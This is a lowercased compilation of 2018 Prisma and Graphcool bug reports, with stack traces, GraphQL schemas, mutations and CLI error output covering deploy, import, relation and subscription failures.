prisma-database_1 | at slick.dbio.synchronousdatabaseaction$fusedandthenaction.$anonfun$run$4$adapted(dbioaction.scala:534)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
prisma-database_1 | {"@timestamp":"2018-01-31t22:08:50.089+00:00","@version":1,"message":"{\\"key\\":\\"request/new\\",\\"requestid\\":\\"api:api:cjd3mj44p0ati0120jbq
4k8xf\\"}","logger_name":"com.prisma.api.server.apiserver","thread_name":"single-server-akka.actor.default-dispatcher-4","level":"info","level_value":20000,"host
name":"95d5b2fb32e2"}
prisma-database_1 | at scala.collection.iterablelike.foreach(iterablelike.scala:71)
prisma-database_1 | at scala.collection.iterablelike.foreach$(iterablelike.scala:70)
prisma-database_1 | at scala.collection.abstractiterable.foreach(iterable.scala:54)
prisma-database_1 | at slick.dbio.synchronousdatabaseaction$fusedandthenaction.run(dbioaction.scala:534)
prisma-database_1 | at slick.dbio.synchronousdatabaseaction$$anon$11.run(dbioaction.scala:571)
prisma-database_1 | at slick.basic.basicbackend$databasedef$$anon$2.liftedtree1$1(basicbackend.scala:240)
prisma-database_1 | at slick.basic.basicbackend$databasedef$$anon$2.run(basicbackend.scala:240)
prisma-database_1 | at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149)
prisma-database_1 | at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624)
prisma-database_1 | at java.lang.thread.run(thread.java:748)
prisma-database_1 | caused by: java.sql.sqlexception: deadlock found when trying to get lock; try restarting transaction
prisma-database_1 | query is: insert into `benchmark@dev`.`_articletosource` (`id`, `a`, `b`)
prisma-database_1 | select 'cjd3mj44b0atf012047wa8gjf', (select id from `benchmark@dev`.`article` where `id` = ?), `id`
prisma-database_1 | from `benchmark@dev`.`source` where `slug` = ? on duplicate key update `benchmark@dev`.`_articletosource`.id=`benchmark@dev`.`_a
rticletosource`.id, parameters ['cjd3mj44a0ata0120dwlzt1n2','test']
prisma-database_1 | at org.mariadb.jdbc.internal.util.logquerytool.exceptionwithquery(logquerytool.java:146)
prisma-database_1 | at org.mariadb.jdbc.internal.protocol.abstractqueryprotocol.executequery(abstractqueryprotocol.java:217)
prisma-database_1 | at org.mariadb.jdbc.mariadbpreparedstatementclient.executeinternal(mariadbpreparedstatementclient.java:218)
prisma-database_1 | ..
if i create a new type and deploy, the console indicate it.
but if i delete it, it's not shown
it fails with the following internal server error:
{ "key": "error/unhandled", "requestid": "...", "clientid": "...", "payload": { "exception": "java.lang.illegalargumentexception: unsupported scalar value in slickextensions: listmap(slug -> some(lol))", "query": "mutation ($_where: clusterusagewhereinput!) {\ deletemanyclusterusages(where: $_where) {\ count\ }\ }\ ", "variables": "{\\"_where\\":{\\"billingdate\\":\\"2018-04-01t00:00:00.000z\\",\\"cluster\\":{\\"name\\":\\"clustr-name\\",\\"workspace\\":{\\"slug\\":\\"lol\\"}}}}", "code": "0", "stack_trace": "com.prisma.api.database.slickextensions$.escapeunsafeparam(slickextensions.scala:93)\\\ com.prisma.api.database.queryarguments$.$anonfun$generatefilterconditions$2(queryarguments.scala:351)\\\ scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234)\\\ scala.collection.immutable.list.foreach(list.scala:389)\\\ scala.collection.traversablelike.map(traversablelike.scala:234)\\\ scala.collection.traversablelike.map$(traversablelike.scala:227)\\\ scala.collection.immutable.list.map(list.scala:295)\\\ com.prisma.api.database.queryarguments$.generatefilterconditions(queryarguments.scala:240)\\\ com.prisma.api.database.queryarguments$.filteronrelation$1(queryarguments.scala:236)\\\ com.prisma.api.database.queryarguments$.$anonfun$generatefilterconditions$2(queryarguments.scala:387)\\\ scala.collection.traversablelike.$anonfun$map$1(traversablelike.scala:234)\\\ scala.collection.immutable.list.foreach(list.scala:389)\\\ scala.collection.traversablelike.map(traversablelike.scala:234)\\\ scala.collection.traversablelike.map$(traversablelike.scala:227)\\\ scala.collection.immutable.list.map(list.scala:295)\\\ com.prisma.api.database.queryarguments$.generatefilterconditions(queryarguments.scala:240)\\\ com.prisma.api.database.databasequerybuilder$.$anonfun$countallfrommodel$1(databasequerybuilder.scala:80)\\\ scala.option.flatmap(option.scala:171)\\\ com.prisma.api.database.databasequerybuilder$.countallfrommodel(databasequerybuilder.scala:79)\\\ com.prisma.api.database.dataresolver.countbymodel(dataresolver.scala:53)\\\ com.prisma.api.database.dataresolver.countbymodel(dataresolver.scala:50)\\\ com.prisma.api.mutations.mutations.deletemany.<init>(deletemany.scala:23)\\\ com.prisma.api.schema.schemabuilderimpl.$anonfun$deletemanyfield$1(schemabuilder.scala:210)\\\ sangria.execution.resolver.resolvefield(resolver.scala:1024)\\\ sangria.execution.resolver.resolvesinglefieldseq(resolver.scala:236)\\\ sangria.execution.resolver.$anonfun$resolveseq$2(resolver.scala:216)\\\ scala.concurrent.future.$anonfun$flatmap$1(future.scala:302)\\\ scala.concurrent.impl.promise.$anonfun$transformwith$1(promise.scala:37)\\\ scala.concurrent.impl.callbackrunnable.run(promise.scala:60)\\\ akka.dispatch.batchingexecutor$abstractbatch.processbatch(batchingexecutor.scala:55)\\\ akka.dispatch.batchingexecutor$blockablebatch.$anonfun$run$1(batchingexecutor.scala:91)\\\ scala.runtime.java8.jfunction0$mcv$sp.apply(jfunction0$mcv$sp.java:12)\\\ scala.concurrent.blockcontext$.withblockcontext(blockcontext.scala:81)\\\ akka.dispatch.batchingexecutor$blockablebatch.run(batchingexecutor.scala:91)\\\ akka.dispatch.taskinvocation.run(abstractdispatcher.scala:40)\\\ akka.dispatch.forkjoinexecutorconfigurator$akkaforkjointask.exec(forkjoinexecutorconfigurator.scala:43)\\\ akka.dispatch.forkjoin.forkjointask.doexec(forkjointask.java:260)\\\ akka.dispatch.forkjoin.forkjoinpool$workqueue.runtask(forkjoinpool.java:1339)\\\ akka.dispatch.forkjoin.forkjoinpool.runworker(forkjoinpool.java:1979)\\\ akka.dispatch.forkjoin.forkjoinworkerthread.run(forkjoinworkerthread.java:107)", "message": "unsupported scalar value in slickextensions: listmap(slug -> some(lol))" }
consider the folowing data type: ```
type folder @model { id: id! @unique parent: folder @relation(name: "folderonfolder", ondelete: set_null) children: [folder!]! @relation(name: "folderonfolder", ondelete: cascade)
``` this seems reasonable
a folder will cascade its deletes _down_ the tree, but only set null up the tree
this causes an error: ```
{ "data": { "deletefolder":null }, "errors": [ { "message": "there was a loop in the path generated by the ondelete: cascade directives on your schema when trying to do the delete.", "locations":[], "path":["deletefolder"], "code":3043, "requestid":"api:api:cjeh2wc500055016429dfdckw" } ]
running `prisma import -d export-2018-03-06t04:48:12.466z.zip -e .env.prod` doesnt complete import instead debugs witha exceeding size exeption:
unzipping..
225ms validating data..
540ms uploading nodes..
client uploading to endpoint +0ms
error: the request content was malformed:
entitystreamsizeexception: actual entity size (some(10049921)) exceeded content length limit (8388608 bytes)! you can configure this by setting `akka.http.[server|client].parsing.max-content-length` or calling `httpentity.withsizelimit` before materializing the databytes stream
at client.<anonymous> (/users/donedgardo/.nvm/versions/node/v8.9.4/lib/node_modules/prisma/node_modules/prisma-cli-engine/src/client/client.ts:321:13) at step (/users/donedgardo/.nvm/versions/node/v8.9.4/lib/node_modules/prisma/node_modules/prisma-cli-engine/dist/client/client.js:32:23) at object.next (/users/donedgardo/.nvm/versions/node/v8.9.4/lib/node_modules/prisma/node_modules/prisma-cli-engine/dist/client/client.js:13:53) at fulfilled (/users/donedgardo/.nvm/versions/node/v8.9.4/lib/node_modules/prisma/node_modules/prisma-cli-engine/dist/client/client.js:4:58) at <anonymous> at process._tickdomaincallback (internal/process/next_tick.js:228:7)
exiting with code: 1
![screen shot 2018-03-06 at 12 53 06 am](
when running prisma:1.3 on aws fargate, the container crashes on boot.
using connect inside an updatemany mutation call returns the error: `"message": "whoops
looks like an internal server error
search your cluster logs for request id: api:api:cjeb19t3f00310150uqe2ihuo",` from cluster logs: `{"key":"error/unhandled","requestid":"api:api:cjeb19t3f00310150uqe2ihuo","clientid":"blaze-service@dev","payload":{"exception":"java.lang.illegalargumentexception: unsupported scalar value in slickextensions: some(listmap(connect -> some(listmap(username -> some(ragzor)))))","query":"mutation updatemanytasks {\ updatemanytasks(where: {id_in: [\\"cjead1ixy0 \\", \\"cjeadhukt0 \\"]}, data: {status: recce, recceuser: {connect: {username: \\"ragzor\\"}}}) {\ count\ }\ }\ ","variables":"{}","code":"0",`
importing a folder that doesn't contain any of the folders `nodes` `lists`, `relations` results in this output: ```sh
validating data 14ms uploading nodes...
uploading nodes done 1ms uploading lists
uploading lists done 0ms uploading relations
uploading relations done 1ms
``` this is misleading
you might try to import a `seed.graphql` file, which is not supported yet as far as i know
in this case, you expect the seed file to be executed, and you don't receive an error message or warning.
after trying to compile typescript, i get the following error: ```
src/generated/prisma.ts(6790,14): error ts2415: class 'prisma' incorrectly extends base class 'prisma'
types of property 'query' are incompatible
type 'query' is not assignable to type 'querymap'
index signature is missing in type 'query'.
when making changes to `datamodel.graphql`, prisma cli seems to cache the previous results for several minutes when trying to deploy those changes
caching may not be the correct term but that's what it best represents in my mind.
`prisma playground` in a folder that contains `.graphqlconfig.yml` opens the file ` ` in the electron playground
![image](
prisma-database_1 | java.lang.illegalargumentexception: requirement failed: this method must only be called for unambiguous relations!
prisma-database_1 | at scala.predef$.require(predef.scala:277)
prisma-database_1 | at com.prisma.shared.models.schema.getunambiguousrelationthatconnectsmodels_$bang(models.scala:114)
prisma-database_1 | at com.prisma.deploy.migration.inference.migrationstepsinferrerimpl.$anonfun$relationstoupdate$3(migrationstepsinferrer.scala:178)
prisma-database_1 | at scala.option.orelse(option.scala:289)
prisma-database_1 | at com.prisma.deploy.migration.inference.migrationstepsinferrerimpl.$anonfun$relationstoupdate$2(migrationstepsinferrer.scala:178)
prisma-database_1 | at scala.collection.traversablelike.$anonfun$flatmap$1(traversablelike.scala:241)
prisma-database_1 | at scala.collection.iterator.foreach(iterator.scala:929)
prisma-database_1 | at scala.collection.iterator.foreach$(iterator.scala:929)
prisma-database_1 | at scala.collection.abstractiterator.foreach(iterator.scala:1417)
creating subscription connections fails, and results in opcode -1.
when deploying a fresh prisma service along with a seed file, the nodes seem to be created, but not the relations between them.
type breed { id: id! @unique animals: [animal!]! } type animal { id: id! @unique name: string! breed: breed!
``` if one of your type has a relation with another one that does not contain anything else than an `id` and relational fields, the `prisma deploy` command will end up with the error: ```bash
syntax error: expected name, found }
``` prisma version: ```bash
$ prisma --version
prisma/1.2.8 (linux-x64) node-v8.7.0
``` adding a dummy string-typed field fixes the issue: ```diff
type breed { id: id! @unique animals: [animal!]! + dummy: string
i'm on prisma 1.2.8.
when i ran `prisma deploy` to a local cluster, the `prisma.ts` and `prisma.graphql` files were updated in my `src/generated` directory (as expected)
however, `prisma.ts` contains this autogenerated line: ```
the `long` scalar type represents non-fractional signed whole numeric values.
long can represent values between -(2^63) and 2^63 - 1.
scalar long
``` this line was added right above the definition for my mutations: ``` """
the `long` scalar type represents non-fractional signed whole numeric values.
long can represent values between -(2^63) and 2^63 - 1.
scalar long type mutation { createuser(data: usercreateinput!): user!
``` this breaks typescript compilation, because the backticks around "long" interfere with the ones wrapping the entire statement:
const typedefs = `....`;
prisma import works for unzipped, but fails on zipped
it appears there's some cache storing an old version of the data
simply extracting the zip file and pointing towards the folder allowed the import
![image 2018-02-22 at 12 41 39 pm]( ![image 2018-02-22 at 12 42 22 pm](
prisma running on google kubernetes engine
currently throwing java.sql.sqlsyntaxerrorexception errors after schema modification and redeploy.
if you add a new cluster with host ` `, connecting to it will return this error: > " ! could not connect to cluster mycluster with host
did you provide the right port?
fails to export `prisma export`
duplicate "graphql" modules cannot be used at the same time since different
versions may have different capabilities and behavior
the data from one
version used in the function from another could produce confusing and
spurious results
at instanceof (/users/mtschimev/owncloud/private_workspace/visual-knight/visual-testing-manager/server/prisma/node_modules/graphql/jsutils/instanceof.js:17:13) at isschema (/users/mtschimev/owncloud/private_workspace/visual-knight/visual-testing-manager/server/prisma/node_modules/graphql/type/schema.js:48:35) at validateschema (/users/mtschimev/owncloud/private_workspace/visual-knight/visual-testing-manager/server/prisma/node_modules/graphql/type/validate.js:51:25) at assertvalidschema (/users/mtschimev/owncloud/private_workspace/visual-knight/visual-testing-manager/server/prisma/node_modules/graphql/type/validate.js:76:16) at object.validate (/users/mtschimev/owncloud/private_workspace/visual-knight/visual-testing-manager/server/prisma/node_modules/graphql/validation/validate.js:61:35) at dorunquery (/users/mtschimev/owncloud/private_workspace/visual-knight/visual-testing-manager/server/prisma/node_modules/apollo-server-core/src/runquery.ts:143:30) at /users/mtschimev/owncloud/private_workspace/visual-knight/visual-testing-manager/server/prisma/node_modules/apollo-server-core/src/runquery.ts:69:39 at <anonymous> at process._tickdomaincallback (internal/process/next_tick.js:228:7)
`prisma info` for a service on a private cluster prints the wrong endpoint.
playground works on now deployment: - [query](
{ feed { id }
{ "data": { "feed": [ { "id": "cjd31fpete4my0144yu893dnl" }, { "id": "cjd31fpf4e4n00144o9ym2fpw" } ] }
playground schema loads but running query throws error on aliased with zeit/now url: when you go to the url directly
interestingly, if you click on the graphqlbin.com share link below, it takes you to the bin and runs the query correctly against the aliased url
- [query](
variables are invalid json: json.parse: expected ':' after property name in object at line 3 column 1 of the json data.
- other note
- this playground share [link]( is sticking the beginnings of a default variable value for some reason.
`prisma delete` to a service on a private cluster results in this error: ```sh
error: authentication token is invalid: token contained 1 grants but none satisfied the request
{ "data": { "deleteproject": null }, "errors": [ { "locations": [ { "line": 2, "column": 9 } ], "path": [ "deleteproject" ], "code": 3015, "message": "authentication token is invalid: token contained 1 grants but none satisfied the request.", "requestid": "cluster:cluster:cjdnfdbb700dd0139nyvwekvt" } ], "status": 200
when i do prisma local start the two docker containers are created, but docker ps gives this
container id image command created status ports names
ab6d1cfda01b mysql:5.7 "docker-entrypoint..." 6 minutes ago up 6 minutes 0.0.0.0:3307->3306/tcp prisma-db
3d52f2c92897 prismagraphql/prisma:1.2 "/app/bin/single-s..." 6 minutes ago restarting (1) 41 seconds ago local_prisma-database_1 ```
new clusters are not added to `prisma cluster list`.
when aliasing a field name for a required field, server throws error `cannot return null for non-nullable field`
stack trace below: ```
error: cannot return null for non-nullable field user.email
at completevalue (c:\\users\\me\\documents\\matchsal-prisma\ ode_modules\\graphql\\execution\\execute.js:648:13) at completevaluewithlocatederror (c:\\users\\me\\documents\\matchsal-prisma\ ode_modules\\graphql\\execution\\execute.js:595:21) at completevaluecatchingerror (c:\\users\\me\\documents\\matchsal-prisma\ ode_modules\\graphql\\execution\\execute.js:564:12) at resolvefield (c:\\users\\me\\documents\\matchsal-prisma\ ode_modules\\graphql\\execution\\execute.js:510:10) at c:\\users\\me\\documents\\matchsal-prisma\ ode_modules\\graphql\\execution\\execute.js:357:18 at array.reduce (<anonymous>) at executefields (c:\\users\\me\\documents\\matchsal-prisma\ ode_modules\\graphql\\execution\\execute.js:354:42) at collectandexecutesubfields (c:\\users\\me\\documents\\matchsal-prisma\ ode_modules\\graphql\\execution\\execute.js:799:10) at completeobjectvalue (c:\\users\\me\\documents\\matchsal-prisma\ ode_modules\\graphql\\execution\\execute.js:781:10) at completevalue (c:\\users\\me\\documents\\matchsal-prisma\ ode_modules\\graphql\\execution\\execute.js:677:12)
running `prisma deploy` on a shared cluster yields the following error
divyendusingh [prisma]$ prisma deploy error: workspace * does not exist { "data": { "generateclustertoken": null }, "errors": [ { "message": "workspace * does not exist", "locations": [ { "line": 3, "column": 9 } ], "path": [ "generateclustertoken" ] } ], "status": 200
log in to cloud with email ( `prisma login`) and running `prisma deploy` gives me the following error: error: patrick.strzelec~testprisma is not a valid name for a service name
it must start with a letter and may contain up to 30 letters, numbers, underscores and hyphens.
{ "data": { "addproject": null }, "errors": [ { "locations": [ { "line": 2, "column": 9 } ], "path": [ "addproject" ], "code": 4001, "message": "patrick.strzelec~testprisma is not a valid name for a service name
it must start with a letter and may contain up to 30 letters, numbers, underscores and hyphens.", "requestid": "cluster:cluster:cjdg5xyvg7ysd01691e7k6win" } ], "status": 200
} ``` and the service is not deployed
it deploys just fine if remove remove the `cloudsessionkey` from `~/.prisma/config.yml`
signing up with a github account that contains a single quote makes deploying impossible
i imagine the same problem occurs for all kinds of different unicode characters in the github name.
i have this schema:
type technology { id: id! @unique name: string! childtechnologies: [technology!]! @relation(name: "childtechnologies") parenttechnologies: [technology!]! @relation(name: "childtechnologies")
``` when trying to add a child techb to the parent techa:
ctx.db.mutation.updatetechnology({ where: { id: "techa" }, data: { childtechnologies: { connect: { id: "techb" } } } }, info)
the final result is:
{ "data": { "technologies": [ { "id": "techa", "name": "my technology updated", "childtechnologies": [ { "id": "techb" } ], "parenttechnologies": [ { "id": "techb" } ] }, { "id": "techb", "name": "another technology", "childtechnologies": [], "parenttechnologies": [] } ] }
input for `prisma cluster add` is not sanitized, leading to unhelpful error message like > could not generate token for local cluster test
error:0906d06c:pem routines:pem_read_bio:no start line when working with clusters.
`set` only overrides first n elements instead of replacing existing list entirely in `update`-mutation
when calling an update mutation via `prisma-binding`, setting a field to `null` has no effect.
when i try to explicit set, in this example, an user role to `driver` and not pass it in the query arguments, it will default to `citizen`.
prisma/1.1.2 (linux-x64) node-v9.4.0 local
upon updating a schema in a specific way, deploy goes into infinite loop with a step
when trying to run a local cluster in an ubuntu server and doing `prisma local start` and using `export debug="*"` it stays in a loop with the following logs: ``` client fetcherror: request to failed, reason: socket hang up client at clientrequest.<anonymous> (/home/johhan_santana/.nvm/versions/node/v8.9.4/lib/node_modules/prisma/node_modules/node-fetch/index.js:133:11) client at emitone (events.js:116:13) client at clientrequest.emit (events.js:211:7) client at socket.socketonend (_http_client.js:423:9) client at emitnone (events.js:111:20) client at socket.emit (events.js:208:7) client at endreadablent (_stream_readable.js:1055:12) client at _combinedtickcallback (internal/process/next_tick.js:138:11) client at process._tickdomaincallback (internal/process/next_tick.js:218:9) +214ms client requesting +504ms
^c client fetcherror: request to failed, reason: socket hang up client at clientrequest.<anonymous> (/home/johhan_santana/.nvm/versions/node/v8.9.4/lib/node_modules/prisma/node_modules/node-fetch/index.js:133:11) client at emitone (events.js:116:13) client at clientrequest.emit (events.js:211:7) client at socket.socketonend (_http_client.js:423:9) client at emitnone (events.js:111:20) client at socket.emit (events.js:208:7) client at endreadablent (_stream_readable.js:1055:12) client at _combinedtickcallback (internal/process/next_tick.js:138:11) client at process._tickdomaincallback (internal/process/next_tick.js:218:9) +3ms
return data from database instead throws an error that the where clause is malformed.
[graphql error]: message: you provided an invalid argument for the where selector on project., location: [object object], path: project
in powershell, i type `prisma login`
this loads the login window
at that point, the chrome console throws the following: ```
observablequery.js:289 unhandled error graphql error: not authorized
please provide a proper 'authorization' header error: graphql error: not authorized
please provide a proper 'authorization' header at new t ( at at at array.foreach (<anonymous>) at at map.foreach (<anonymous>) at e.broadcastqueries ( at object.next ( at p.next ( at
e._subscription.e._subscription._observer.e._subscription._observer.error.e._subscription._observer.error @ observablequery.js:289
2react-apollo.browser.umd.js:545 unhandled (in react-apollo:apollo(withrouter(t))) error: graphql error: not authorized
please provide a proper 'authorization' header at new t ( at t.currentresult ( at l.dataforchild ( at l.render ( at s ( at beginwork ( at o ( at a ( at u ( at _ (
``` then, i try to login with github
authorizing graphcool in github works fine, but then on redirect the console throws:
2api.cloud.prisma.sh/:1 post 400 ()
github:1 failed to load no 'access-control-allow-origin' header is present on the requested resource
origin ' is therefore not allowed access
the response had http status code 400
if an opaque response serves your needs, set the request's mode to 'no-cors' to fetch the resource with cors disabled.
``` clicking \'submit\' on the confirmation screen then triggers a toast that says "failed to fetch:
![image]( going directly to `app.prismagraphql.com` and registering w/ email/password works as expected.
after deploying a service on the `prisma-eu1` cluster i want to delete it using `prisma delete` on checking if it is really deleted with `prisma list` the service name is still on the list
`prisma deploy --interactive` deploys like `prisma deploy`
![image](
src/generated/prisma.ts is not updated on adding a new type to database/datamodel.graphql
prisma login allows you to log in using graphcool credentials for a user with email id containing a "." but `prisma deploy` fails for such a user with error
partially omitted log: ```
"message": "divyendu.z~prisma-base is not a valid name for a service name
it must start with a letter and may contain up to 30 letters, numbers, underscores and hyphens.",
prisma deploy just generates the prisma.graphql file but no prisma.ts
firing a mutation in the subscriptions example throws the error: `[network error]: fetcherror: request to failed, reason: connect econnrefused 127.0.0.1:60000` changing the prisma endpoint being supplied to `graphql-yoga` to `' ` resolves this error
without any errors, listening on the `publications` subscription and firing `writepost` doesn't trigger any subscription events.
`prisma deploy --dry-run` returns the following, even for a fresh service
divyendusingh [prisma-101]$ prisma deploy --dry-run
performing dry run for service `prisma-101` to stage `dev` on cluster `local` 329ms
service is already up to date.
i'm able to create a relation between two nodes via `connect`, but when attempting to `disconnect`, i'm unable to query either node with a unique field
**example:**
_user b_ follows _user a_ via `connect`
row added to the `userfollows` relation.
```js async follow(parent, args, ctx, info) { const auth0id = await parseuserauth0id(ctx) return await ctx.db.mutation.updateuser({ where: { username: args.username }, data: { followers: { connect: [{ auth0id }] } } }) },
``` _user b_ unfollows _user a_ via `disconnect`
error is thrown: `the relation userfollows has no node for the model user with value `logan` for username connected to a node for the model user with value `cjcdjow1t00310181tctl316f` for id, location: [object object], path: updateuser` ```js async unfollow(parent, args, ctx, info) { const auth0id = await parseuserauth0id(ctx) return await ctx.db.mutation.updateuser({ where: { username: args.username }, data: { followers: { disconnect: [{ auth0id }] } } }) }
if you use `@default` to add a default value to a field it works when you use create, but not when using upsert
when selecting a new cluster for a different stage of an existing project using the interactive mode throws an error.
graphql create command of the graphql cli creates a new project with a service name as "." when a directory name is not entered.
if i execute an upsert with a connect inside (running 1.0 beta4) i get the following error: "unsupported scalar value in slickextensions: some(listmap(connect -> some(listmap(id -> some(cjc99y7q4006e0181fulirnrj)))))"
if i run the upsert without the connect everything works fine.
2018-01-09t07:42:50.148z 46ms failure { "error": "function returned invalid status code: 0
raw body: empty.last"
when creating a new deployment with `graphcool-framework deploy` the resulting `./.build/build.zip` file, which is uploaded to the cluster, contains itself
there are two problems with this:
build might never finish (because archive references itself)
build can potentially become very big (mine was over 10gb in size)
`gcf import --source ./seed.zip` leads to: ```shell config definitionpath null +0ms config homepath /users/xxx/.graphcoolrc +0ms config localrcpath /users/xxx/xxx/xxxx/.graphcoolrc +0ms config globalrcpath /users/nick/.graphcoolrc +0ms
typeerror: cannot read property 'modules' of undefined at import.<anonymous> (/users/nick/.config/yarn/global/node_modules/graphcool-cli-core/src/commands/import/index.ts:39:47) at step (/users/nick/.config/yarn/global/node_modules/graphcool-cli-core/dist/commands/import/index.js:42:23) at object.next (/users/nick/.config/yarn/global/node_modules/graphcool-cli-core/dist/commands/import/index.js:23:53) at fulfilled (/users/nick/.config/yarn/global/node_modules/graphcool-cli-core/dist/commands/import/index.js:14:58) at <anonymous>
exiting with code: 1
after creating a project and deploying it locally, i've played with it a bit, added some functions and everything was fine
i modified them once or twice
however, the next time i modified them i got `ensure that the code is valid` whatever i did
even if the body of the function was as simple as it could be
(like `f (x) { return x }` for operationbefore)
i even removed all functions and left only the ones that have not been previously modified but the error persisted
the bottom line is that it seems that it's quite easy (but not obvious how) to cause some invalid internal state which causes this issue
after removing all docker images and data connected to them, i could successfully deploy the functions.
running local graphcool cluster at
this may take several minutes
$ docker-compose up -d --remove-orphans docker traceback (most recent call last):
docker file "docker-compose", line 6, in <module>
docker file "compose\\cli\\main.py", line 68, in main
docker file "compose\\cli\\main.py", line 121, in perform_command
docker file "compose\\cli\\main.py", line 938, in up
docker file "compose\\project.py", line 417, in up
docker file "compose\\project.py", line 646, in warn_for_swarm_mode
docker file "site-packages\\docker\\api\\daemon.py", line 90, in info
docker file "site-packages\\docker\\utils\\decorators.py", line 46, in inner
docker file "site-packages\\docker\\api\\client.py", line 189, in _get
docker file "site-packages\ equests\\sessions.py", line 488, in get
docker file "site-packages\ equests\\sessions.py", line 475, in request
docker file "site-packages\ equests\\sessions.py", line 596, in send
docker file "site-packages\ equests\\adapters.py", line 423, in send
docker file "site-packages\ equests\\packages\\urllib3\\connectionpool.py", line 595, in urlopen
docker file "site-packages\ equests\\packages\\urllib3\\connectionpool.py", line 363, in _make_request
docker file "httplib.py", line 1042, in request
docker file "httplib.py", line 1082, in _send_request
docker file "httplib.py", line 1038, in endheaders
docker file "httplib.py", line 882, in _send_output
docker file "httplib.py", line 844, in send
docker file "site-packages\\docker\\transport\ pipeconn.py", line 31, in connect
docker file "site-packages\\docker\\transport\ pipesocket.py", line 22, in wrapped
docker file "site-packages\\docker\\transport\ pipesocket.py", line 50, in connect
docker pywintypes.error: (2, 'waitnamedpipe', 'the system cannot find the file specified.')
docker failed to execute script docker-compose
exiting with code: 1
when creating or editing functions via web console autocomplete (intellisense) menu is hidden beneath other layers of webpage.
![image](
returning data other than `{ data: {} }` and `{ error: {} }` results in an internal server error
> graphql error: whoops
looks like an internal server error
please contact us from the console ( or via email (support@graph.cool) and include your request id
local simple endpoint does not expose permission schema
currently the relayidtable maps globally unique ids to model names
this fails with the following exception as we have a size limit of 25 chars on the column: ```
caused by: java.sql.sqlexception: data too long for column 'modelid' at row 1
query is: insert into `cloud-api@dev`.`_relayid` (`id`,`modelid`) values (?,?), parameters ['cjbcglwa500hp0177zc5ejo9e','clusterprovisionrequestprogress']
``` i did not consider the relayids at all when removing the model id
we should reintroduce stable ids for the sole purpose of using in the relayid table
if we would use the model name instead, we would have to update all the rows in this table on each model rename.
when running `graphcool local up` i get this error `running local graphcool cluster at
running local faas runtime at
this may take several minutes
$ docker-compose up -d --remove-orphans error: spawn docker-compose enoent at _errnoexception (util.js:1031:13) at process.childprocess._handle.onexit (internal/child_process.js:201:19) at onerrornt (internal/child_process.js:389:16) at _combinedtickcallback (internal/process/next_tick.js:138:11) at process._tickcallback (internal/process/next_tick.js:180:9)
exiting with code: 1` after running debug i get this ` portfinder:getport in eachseries() result callback: err is { error: listen eaddrnotavail fe80::aede:48ff:fe00:1122:60000 at object._errnoexception (util.js:1031:13) at _exceptionwithhostport (util.js:1052:20) at server.setuplistenhandle [as _listen2] (net.js:1350:19) at listenincluster (net.js:1408:12) at dolisten (net.js:1523:7) at _combinedtickcallback (internal/process/next_tick.js:141:11) at process._tickcallback (internal/process/next_tick.js:180:9) errno: 'eaddrnotavail', code: 'eaddrnotavail', syscall: 'listen', address: 'fe80::aede:48ff:fe00:1122', port: 60000 }`
subscription on new model:
``` subscription allevents { event(filter:{ mutation_in: [deleted, updated, created] }) { mutation node { id title image description date ctatext ctabutton ctalink createdat updatedat } previousvalues { id } } } ----------------------------------------result----------------------------------------------
{ "data": null, "error": [ { "message": "the provided query doesn\'t include any known model name
please check for the latest subscriptions api." } ]
``` although the model does actually exist ```
type event @model { id: id! @isunique title: string! image: string description: string! date: datetime! ctatext: string ctabutton: string ctalink: string createdat: datetime! updatedat: datetime!
``` subscription on existing model with new fields - source: source (enum)
- ctatext: string
- ctabutton: string
- ctalink: string ``` subscription blogpostsinglesub { blogpost(filter:{ mutation_in: [deleted, updated, created] }) { mutation node { id source ctatext ctabutton ctalink } } } ----------------------------------------result----------------------------------------------
{ "data": null, "error": [ { "message": "cannot query field \'source\' on type \'blogpost\'
(line 8, column 9):\ source\ ^" } ]
``` if you remove source from the query, it will then complain about ctatext and so on..
until all newly added fields are gone.
when sending a subscription that declares required variables, but no variables are included, no validation error is returned.
it's possible to update `[json!]!` fields with invalid values.
i am using the local development workflow and have encountered a strange error
i changed a number of fields on an existing type and created a subscription that is triggered when a related type is updated
in the subscription definition i use the fields that i recently updated
when i attempted to redeploy my service i was met with an error on my newly defined subscription saying that the fields i had just updated did not exist
this issue can be resolved by removing all local containers & images.
trying to send a push notification to my react-native/test web app via the relevant mutation `mutation { pushnotification(channels: ["donuts"], event: "la", message: "yo") { success }
}` produces an error in the function log: `{"error":"function returned invalid status code: 0
raw body: empty.last"}`
same as in #1031
the notification does appear though, at least for the web app.
open a permission tab from the web console, can't run any `somexxxexists` query
the first bug i observed is that the websites hosted on netlify are broken
example link: [how to create an algolia key]( #creating-algolia-search-indices)
the second bug is that whenever i try to add algolia keys to a newly created application, it gives the following error: > please check that the application id and api key is correct
you can find both on the api keys page in the algolia web interface
you must create a new api key and enable 'add records' and 'delete records'
make sure that you are not using the admin api key, as algolia doesn't allow it to be used here
i have developed tons of netlify and been doing that for more than a year
i can definitely check the website code if you'd like to have contribution on my behalf.
using the following schema and [following the "combined" nested create/nested connect technique described here]( ```
type post @model { createdat: datetime! createdby: user @relation(name: "postsbyuser") description: string @defaultvalue(value: "\'\'") id: id! @isunique tags: [tag!] @relation(name: "tagsofpost") ...
type tag @model { id: id! @isunique tag: string! createdby: user @relation(name: "tagsbyuser") createdat: datetime! posts: [post!] @relation(name: "tagsofpost")
``` where i have a `post` type with a `tags` field (many-to-many relationship between `post`->`tag`)
when i run a mutation to update a `post`\'s tags, there are 2 graphcool-generated parameters i can include per the api: <img width="273" alt="schema-2" src=" "> - `tagsids`: an array of `id`s of existing `tag`s to be associated with the `post` (i.e., `["aabbccddeeffgg", "hhiijjkkllmmnn"]`)
- `tags`: array _new_ tags to create and associate with this `post` (i.e., `[{"tag: "newtag1"}, {"tag": "newtag2"}..
]`) if i only include `tags` _or_ `tagsids` in the mutation, it works as expected, i.e
this works (only pass `tags`): ```
const updatepostquery = ({ id, createdbyid, timestamp, description, tags,
}) => ({ mutation: gql` mutation updatepost( $id: id! $createdbyid: id! $timestamp: datetime! $description: string $tags: [posttagstag!] ) { updatepost( id: $id createdbyid: $createdbyid timestamp: $timestamp description: $description tags: $tags ) { id timestamp description tags { id tag } createdby { id username } } } `, variables: { id, createdbyid, timestamp, description, tags, },
